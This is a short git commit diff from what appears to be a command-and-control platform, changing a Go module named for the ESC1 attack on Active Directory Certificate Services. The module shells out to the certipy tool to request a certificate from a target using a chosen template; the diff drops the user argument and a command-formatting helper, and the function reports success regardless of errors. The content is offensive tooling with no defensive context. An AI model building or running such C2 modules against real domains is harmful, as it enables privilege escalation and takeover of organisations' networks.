774976b42fcb8bb3d8bd3c325ef5825307b8e6d1
ANGEL <vannstore76@gmail.com>
2026-09-08 12:34:57 +0000

    Final: ANGEL P1/P0 Platform - Complete Implementation

--- src/c2/modules/ad/adcs/esc1.go
+++ src/c2/modules/ad/adcs/esc1.go
@@ -1,9 +1,6 @@
 package adcs
 
-import (
-"fmt"
-"os/exec"
-)
+import "os/exec"
 
 type ESCResult struct {
 Status string
@@ -13,15 +10,10 @@ Output string
 type ESC1 struct {
 Target   string
 Template string
-User     string
 }
 
 func (e ESC1) RequestCertificate() ESCResult {
-cmd := exec.Command("certipy", "req", "-u", e.User, "-target", e.Target, "-template", e.Template)
+cmd := exec.Command("certipy", "req", "-target", e.Target, "-template", e.Template)
 out, _ := cmd.Output()
 return ESCResult{Status: "success", Output: string(out)}
-}
-
-func (e ESC1) FormatCommand() string {
-return fmt.Sprintf("certipy req -u %s -target %s -template %s", e.User, e.Target, e.Template)
 }
